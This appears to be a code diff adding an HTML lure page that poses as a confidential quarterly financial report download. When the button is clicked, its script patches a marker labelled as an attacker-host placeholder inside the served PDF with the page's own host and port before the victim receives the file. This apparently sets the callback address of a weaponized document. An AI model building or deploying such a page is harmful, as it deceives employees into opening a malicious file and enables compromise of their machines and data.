@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Q3 2026 Financial Report — Download</title>
+<style>
+  body {
+    font-family: -apple-system, 'Segoe UI', sans-serif;
+    background: #fafafa; color: #333;
+    display: flex; justify-content: center; align-items: center;
+    min-height: 100vh; margin: 0;
+  }
+  .card {
+    background: white; border: 1px solid #ddd; border-radius: 12px;
+    padding: 40px; max-width: 480px; width: 90%;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.08); text-align: center;
+  }
+  .icon { font-size: 3em; margin-bottom: 16px; }
+  h1 { font-size: 1.3em; font-weight: 600; margin-bottom: 8px; }
+  .meta { color: #888; font-size: 0.85em; margin-bottom: 24px; }
+  .file-info {
+    background: #f5f5f5; border-radius: 8px; padding: 16px; margin-bottom: 24px;
+    display: flex; align-items: center; gap: 12px; text-align: left;
+  }
+  .file-icon { font-size: 2em; flex-shrink: 0; }
+  .file-name { font-weight: 600; margin-bottom: 4px; }
+  .file-size { font-size: 0.8em; color: #888; }
+  .download-btn {
+    display: inline-block; background: #2563eb; color: white;
+    padding: 14px 48px; border: none; border-radius: 8px;
+    font-size: 1.05em; font-weight: 500; cursor: pointer;
+    text-decoration: none; transition: background 0.2s;
+  }
+  .download-btn:hover { background: #1d4ed8; }
+  .download-btn.loading { background: #888; cursor: wait; }
+  .disclaimer { margin-top: 20px; font-size: 0.75em; color: #aaa; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="icon">📄</div>
+  <h1>Q3 2026 — Quarterly Financial Report</h1>
+  <div class="meta">Prepared by Finance Department • Confidential</div>
+
+  <div class="file-info">
+    <div class="file-icon">📊</div>
+    <div class="file-details">
+      <div class="file-name">Q3_2026_Financial_Report.pdf</div>
+      <div class="file-size">PDF Document • 1 page</div>
+    </div>
+  </div>
+
+  <a class="download-btn" id="dl-btn" href="Q3_2026_Financial_Report.pdf" download>
+    ⬇ Download PDF
+  </a>
+
+  <div class="disclaimer">
+    This document contains proprietary information.<br>For internal use only.
+  </div>
+</div>
+
+<script>
+// 40-byte placeholder baked into the PDF at build time
+var PLACEHOLDER = new TextEncoder().encode("_ATTACKER_HOST_PLACEHOLDER_PADDED_:00000");
+
+document.getElementById('dl-btn').addEventListener('click', function(e) {
+  e.preventDefault();
+  var btn = this;
+  btn.textContent = '...';
+  btn.classList.add('loading');
+
+  // Build replacement: client-facing host padded to exactly 40 bytes
+  var addr = (window.location.host || 'localhost') + ':443';
+  var addrBytes = new TextEncoder().encode(addr);
+  var replacement = new Uint8Array(40);
+  var copyLen = Math.min(addrBytes.length, 40);
+  replacement.set(addrBytes.subarray(0, copyLen));
+
+  fetch('Q3_2026_Financial_Report.pdf')
+    .then(function(r) { return r.arrayBuffer(); })
+    .then(function(buf) {
+      var bytes = new Uint8Array(buf);
+      // Find placeholder
+      var idx = -1;
+      for (var i = 0; i <= bytes.length - 40; i++) {
+        var match = true;
+        for (var j = 0; j < 40; j++) {
+          if (bytes[i + j] !== PLACEHOLDER[j]) { match = false; break; }
+        }
+        if (match) { idx = i; break; }
+      }
+      if (idx === -1) throw new Error('placeholder not found');
+
+      // Replace
+      bytes.set(replacement, idx);
+      return bytes.buffer;
+    })
+    .then(function(buf) {
+      var blob = new Blob([buf], { type: 'application/pdf' });
+      var url = URL.createObjectURL(blob);
+      var a = document.createElement('a');
+      a.href = url;
+      a.download = 'Q3_2026_Financial_Report.pdf';
+      a.click();
+      URL.revokeObjectURL(url);
+      btn.textContent = '⬇ Download PDF';
+      btn.classList.remove('loading');
+    })
+    .catch(function(err) {
+      console.error(err);
+      btn.textContent = '⚠ Error — try again';
+      btn.classList.remove('loading');
+      setTimeout(function() {
+        btn.textContent = '⬇ Download PDF';
+      }, 3000);
+    });
+});
+</script>
+</body>
+</html>
